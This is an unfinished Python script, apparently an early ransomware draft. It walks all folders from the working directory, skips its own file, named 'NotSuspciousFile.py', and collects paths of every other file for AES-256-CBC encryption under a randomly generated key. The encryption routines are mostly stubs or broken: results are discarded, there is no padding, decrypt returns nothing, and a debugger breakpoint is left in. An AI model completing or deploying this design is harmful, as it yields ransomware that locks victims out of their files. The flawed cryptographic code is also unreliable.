import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import pdb

IV_KEY_LENGTH = 16
ENC_DEC_KEY_LENGTH = 32
#Retrieves the path to the current location of this file
curr_path = os.getcwd()
#Force python to skip the python cache folder
skip_folder = '\__pycache__'
#Force python to remove these list of items from the root folder directory
#Because it is our code
skip_file = 'NotSuspciousFile.py'
pdb.set_trace()
for root, dirs, files in os.walk('.'):
    #The current folder that we are inspecting
    curr_folder = root.replace('.', '', 1)
    if(curr_folder == skip_folder):
        continue
    if(curr_folder == '') :
        files.remove(skip_file)
    for i in range(len(files)) :
        #file_to_encrypt is the absolute path to the file
        file_to_encrypt = curr_path + curr_folder + "\\" + files[i]
        #Get the extension of the file to encrypt
        split_string = file_to_encrypt.split('.')
        encrypted_file_path = split_string[0]
        file_extension = split_string[len(split_string) - 1]

##########################################################
# Using a generated IV and predetermined key, a file is 
# encrypted using AES-256 CBC
##########################################################
def MyEncrypt(file, key):
    #Return an error if the key length is not length 32
    if(len(key) != ENC_DEC_KEY_LENGTH) :
        raise ValueError('Key length must be of size 32')
    #Generate an IV of length 16
    IV = generateRandom(IV_KEY_LENGTH)
    cipher = createCipher(IV, key)
    encryptor = cipher.encryptor()
    cipher_text = encryptor.update(file) + encryptor.finalize()
        
    return cipher_text, IV

##########################################################
# Using a 32-bit generated key, a file will be read into 
# Myencrypt to be encrypted, then stored into a JSON file.
##########################################################
def MyfileEncrypt(file_path):
    key = generateRandom(ENC_DEC_KEY_LENGTH)
    file = encodeFile(file_path)
    MyEncrypt(file, key)


    pass

##########################################################
# 
##########################################################
def MyDecrypt(cipher_text, key, iv):
    if(len(key) != ENC_DEC_KEY_LENGTH and len(iv) != IV_KEY_LENGTH) :
        raise ValueError('Key/IV length is mismatched.')
    cipher = createCipher(iv, key)
    decryptor = cipher.decryptor()
    decryptor.update(cipher_text) + decryptor.finalize() 
    return 

def MyfileDecrypt():
    pass

def encodeFile(file_path):
    
    pass

def decodeFile(file_path):
    
    pass

def generateRandom(key_length):
    #Idk if this is the right way to generate it
    return os.urandom(key_length)

##########################################################
#   Generates magic box to encrypt and decrypt files
##########################################################
def createCipher(iv, key):
    if(len(key) != 32) :
        raise ValueError('Key length must be of size 32')
    #Encrypt the message using the key and IV in CBC mode in AES
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    return cipher
        